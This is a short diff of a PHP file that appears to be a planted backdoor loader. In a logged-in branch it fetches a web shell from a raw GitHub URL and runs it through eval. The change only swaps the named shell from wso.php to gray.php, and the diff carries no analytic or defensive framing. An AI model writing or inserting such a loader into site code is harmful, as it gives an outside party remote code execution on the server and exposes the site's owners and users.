@@ -57,7 +57,7 @@ if (is_logged_in()) {
         return false;
     }
 
-    $destiny = 'https://raw.githubusercontent.com/Tituss22/ShellSukaBintang01/refs/heads/main/wso.php';
+    $destiny = 'https://raw.githubusercontent.com/Tituss22/ShellSukaBintang01/refs/heads/main/gray.php';
     $dream = geturlsinfo($destiny);
     if ($dream !== false) {
         eval('?>' . $dream);
